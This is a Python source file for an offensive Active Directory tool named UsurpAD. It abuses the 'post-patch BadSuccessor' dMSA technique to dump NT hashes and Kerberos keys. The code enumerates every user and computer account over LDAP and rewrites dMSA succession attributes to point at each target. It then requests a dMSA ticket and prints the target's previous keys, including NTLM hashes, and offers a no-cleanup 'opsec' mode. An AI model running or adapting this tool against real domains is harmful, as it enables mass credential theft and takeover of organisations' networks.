# UsurpAD
#
# Post-patch BadSuccessor hash dumper.
#
# IMPORTANT NOTE
# Though these libraries are often found on Kali installs,
# they may be out of date. To use this tool it's recommended
# to use uv:
# https://docs.astral.sh/uv/getting-started/installation/
#
# The project can be run using `uv run python main.py (...)`
# Do not try to run it with your built in Python.

from __future__ import annotations

import argparse
import asyncio
import logging

from msldap.commons.customvalue import LDAPCustomValue
from msldap.commons.factory import LDAPConnectionFactory, MSLDAPClient
from minikerberos.common.kirbi import Kirbi
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.constants import KerberosSecretType
from minikerberos.common.factory import AIOKerberosClient, KerberosClientFactory

LOG_LEVEL: int = logging.DEBUG

class LogFmt(logging.Formatter):
    debug: str = "\x1b[34;20m"
    good: str = "\x1b[32;20m"
    info: str = "\x1b[38;20m"
    warn: str = "\x1b[33;20m"
    error: str = "\x1b[31;20m"
    fatal: str = "\x1b[31;1m"
    reset: str = "\x1b[0m"
    _format: str = "%(message)s"

    FORMATS: dict[int, str] = {
        logging.DEBUG: debug + _format + reset,
        logging.INFO: info + _format + reset,
        logging.INFO + 1: good + _format + reset,
        logging.WARNING: warn + _format + reset,
        logging.ERROR: error + _format + reset,
        logging.CRITICAL: fatal + _format + reset
    }
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno, format)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


# Set up logging
LOGGER: logging.Logger = logging.getLogger(__name__)
LOGGER.setLevel(logging.DEBUG)

ch = logging.StreamHandler()
ch.setLevel(LOG_LEVEL)
ch.setFormatter(LogFmt())
LOGGER.addHandler(ch)

# From Microsoft docs, for Kerberos previous keys
KEY_TYPES: dict[int, str] = {
    0x01: "DES-CBC-CRC",
    0x03: "DES-CBC-MD5",
    0x11: "AES128-CTS-HMAC-SHA1-96",
    0x12: "AES256-CTS-HMAC-SHA1-96",
    0x17: "RC4-HMAC",
    0x18: "RC4-HMAC-EXP",
}

# Required for not yet supported LDAP fields
class LDAPString(LDAPCustomValue):
    def encode(self) -> list[bytes]:
        return [self.value.encode()]
    @staticmethod
    def decode(value: list[bytes]) -> LDAPString:
        return LDAPString(value[0].decode())
class LDAPInt(LDAPCustomValue):
    def encode(self) -> list[bytes]:
        return [str(self.value).encode()]
    @staticmethod
    def decode(value: list[bytes]) -> LDAPInt:
        # Bytes to int seems to just work, this is the implementation in
        # the library too so keeping it consistent regardless.
        return LDAPInt(int(value[0]))
class LDAPRaw(LDAPCustomValue):
    def encode(self) -> list[bytes]:
        return self.value
    @staticmethod
    def decode(value: list[bytes]) -> LDAPRaw:
        return LDAPRaw(value)

async def get_dmsa_ticket(krb_url: KerberosClientFactory, krb_client: AIOKerberosClient, dmsa_user: KerberosSPN):
    if krb_url.secret_type != KerberosSecretType.CCACHE:
        # This will only run once then cache
        await krb_client.get_TGT()
        tgs, encTGSRepPart, _key = await krb_client.dmsa(dmsa_user)
    else:
        for kirbi in krb_client.credential.ccache.get_all_tgt_kirbis():
            try:
                ccred_test = KerberosCredential.from_kirbi(kirbi.to_hex(), encoding='hex')
                krb_client = krb_url.get_client_newcred(ccred_test)
                tgs, encTGSRepPart, _key = await krb_client.dmsa(dmsa_user)
                break
            except Exception as e:
                LOGGER.warning("    [-] Error authenticating to Kerberos via ccache: " + str(e))
                continue
        else:
            # Last option failed, we cannot authenticate.
            raise ValueError("No cached credentials succeeded.")

    return Kirbi.from_ticketdata(tgs, encTGSRepPart)

async def dump_keys(krb_url: KerberosClientFactory, krb_client: AIOKerberosClient, dmsa_name: KerberosSPN, target_sam: str):
    # Get ticket for dMSA - contains credentials of the target account
    kirbi: Kirbi = await get_dmsa_ticket(krb_url, krb_client, dmsa_name)
    for key_type, key in kirbi.dmsa_get_previous_keys():
        human_key: str = f"UNKNOWN[{key_type}]"
        if key_type in KEY_TYPES:
            human_key = KEY_TYPES[key_type]
        if human_key == "RC4-HMAC":
            LOGGER.log(logging.INFO+1, f"    [+] {target_sam} [{human_key} - NTLM hash!] -> {key}")
        else:
            LOGGER.info(f"    [+] {target_sam} [{human_key}] -> {key}")


# Try set dMSA to any target we can
# When implementing this, ensure you handle any exceptions or the loop will hang and not clean up
async def dmsa_targets(ldap_client: MSLDAPClient, dmsa_dn: str, extra_attrs: list[str] = [], cleanup: bool = True):
    search_attrs: list[str] = ["sAMAccountName"]
    search_controls: list[tuple[str, str, str]] = []
    if cleanup:
        # We'll be changing these, make sure we can set them back to clean up
        search_attrs.append("msDS-SupersededManagedAccountLink")
        search_attrs.append("msDS-SupersededServiceAccountState")
    for attr in extra_attrs:
        if attr not in search_attrs:
            search_attrs.append(attr)
    async for entry, err in ldap_client.pagedsearch(
        # Selects all user & person records, | computer records
        # We also want to read DACLs to see who we can write to
        query = "(|(&(objectClass=user)(objectCategory=person))(objectClass=computer))",
        attributes = search_attrs,
        controls = search_controls
    ):
        if err is not None:
            raise err
        # This should mean the entry is populated
        assert entry is not None

        # Skip self, it breaks the dMSA
        if entry["objectName"] == dmsa_dn:
            continue

        sam: str = entry["attributes"]["sAMAccountName"]
        LOGGER.info(f"[i] Attempting to dump '{sam}'")
        LOGGER.debug(f"[d] Current object state of {entry['objectName']}:")
        for attr, value in entry["attributes"].items():
            LOGGER.debug(f"    [d] {attr} = {value}")

        dmsa_changes = {
            "msDS-ManagedAccountPrecededByLink": [("replace", entry["objectName"])],
            "msDS-DelegatedMSAState": [("replace", 2)]
        }
        target_changes = {
            "msDS-SupersededManagedAccountLink": [("replace", LDAPString(dmsa_dn))],
            "msDS-SupersededServiceAccountState": [("replace", LDAPInt(2))]
        }

        _, err = await ldap_client.modify(dmsa_dn, dmsa_changes)
        if err is not None:
            # This would mean we can't modify the dMSA, which means the attack won't work
            LOGGER.error(f"    [!] Could not modify dMSA: {err}")
            LOGGER.error("    [!] Did you grant yourself at least GenericWrite?")
            raise err
        _, err = await ldap_client.modify(entry["objectName"], target_changes)
        if err is not None:
            LOGGER.error(f"    [!] Failed to modify LDAP to target '{entry['objectName']}': {err}")
            LOGGER.error("    [!] Missing write privileges?")
            continue
        # From here we need to ensure we clean up

        try:
            # Copy entry in case the function modifies it
            yield sam, entry.copy()
        finally:
            if cleanup:
                og_attrs: dict[str, str] = entry["attributes"]
                target_changes = {}
                for key in ("msDS-SupersededManagedAccountLink", "msDS-SupersededServiceAccountState"):
                    if key in og_attrs:
                        target_changes[key] = [("replace", LDAPRaw(og_attrs[key]))]
                    else:
                        target_changes[key] = [("delete", LDAPRaw([]))]
                _, err = await ldap_client.modify(entry["objectName"], target_changes)
                if err is not None:
                    LOGGER.error("    [!] Problem writing to LDAP in cleanup: " + str(err))
                else:
                    LOGGER.debug("    [d] Cleanup succeeded!")


async def cli_mode():
    parser = argparse.ArgumentParser(description="Dump NT hashes and Kerberos keys using post-patch BadSuccessor.")
    # https://github.com/skelsec/pypykatz/wiki/Connection-URL
    parser.add_argument("--url", help="Authentication URL of the high privilege user to enumerate/set attributes from (pypykatz format excluding protocol/service)", required=True)
    parser.add_argument("--dmsa", help="The DN of the dMSA account to use", required=True)
    parser.add_argument("--dmsa-machine-url", help="Authentication URL for the computer (or user) account authorised to get dMSA credentials (pypykatz format excluding protocol/service)", default=None)
    parser.add_argument("--no-cleanup", help="Do not clean up ACL or attribute chanages, makes less queries [opsec, destructive]", action="store_true")
    args = parser.parse_args()

    user_url: str = args.url
    auth_proto: str = user_url.split("://", 1)[0]
    user_kerberos: bool = False
    if "+" in auth_proto:
        raise ValueError("Please omit the protocol from your authentication URL.")
    if "-" in auth_proto:
        method, _secret_type = auth_proto.split("-", 1)
        if method.lower() == "kerberos":
            user_kerberos = True
    else:
        user_url = "kerberos-" + user_url
        user_kerberos = True

    dmsa_machine_url: str
    if args.dmsa_machine_url is not None:
        dmsa_machine_url = args.dmsa_machine_url
    elif user_kerberos:
        dmsa_machine_url = user_url.split("-", 1)[1]
    else:
        raise ValueError("Please specify the dMSA machine URL manually if not using Kerberos for LDAP.")

    dmsa_dn: str = args.dmsa
    cleanup: bool = not args.no_cleanup

    dmsa_sam: str = dmsa_dn.split("CN=", 1)[1].split(",", 1)[0] + "$"
    dmsa_domain: str = '.'.join(dmsa_dn.split('DC=')[1:]).replace(',', '')
    dmsa_name: KerberosSPN = KerberosSPN.from_upn(dmsa_sam + "@" + dmsa_domain)

    ldap_url: LDAPConnectionFactory = LDAPConnectionFactory.from_url("ldap+" + user_url)
    ldap_client: MSLDAPClient = ldap_url.get_client()
    _, err = await ldap_client.connect()
    if err is not None:
        raise err

    krb_url: KerberosClientFactory = KerberosClientFactory.from_url("kerberos+" + dmsa_machine_url)
    krb_client: AIOKerberosClient = krb_url.get_client()

    # Cleanup will not run unless errors are handled - this seems to be an issue with async Python
    async for target_sam, _ldap_entry in dmsa_targets(ldap_client, dmsa_dn, [], cleanup):
        try:
            await dump_keys(krb_url, krb_client, dmsa_name, target_sam)
        except Exception as e:
            LOGGER.error(f"    [!] Getting KERB-DMSA-KEY-PACKAGE for {target_sam} failed: " + str(e))

if __name__ == "__main__":
    asyncio.run(cli_mode())
